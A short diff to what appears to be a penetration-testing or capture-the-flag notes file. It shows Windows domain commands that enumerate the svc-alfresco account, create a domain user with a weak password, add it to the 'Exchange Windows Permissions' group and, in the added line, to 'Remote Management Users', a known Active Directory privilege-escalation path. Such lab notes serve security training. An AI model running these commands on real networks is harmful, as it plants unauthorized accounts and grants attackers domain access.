@@ -38,6 +38,8 @@ net user svc-alfresco /domain
 net user buser Passw0rd /add /domain
 
 net group "Exchange Windows Permissions" buser /add
+
+net localgroup "Remote Management Users" buser /add
 ```
 CyberChef
 ```
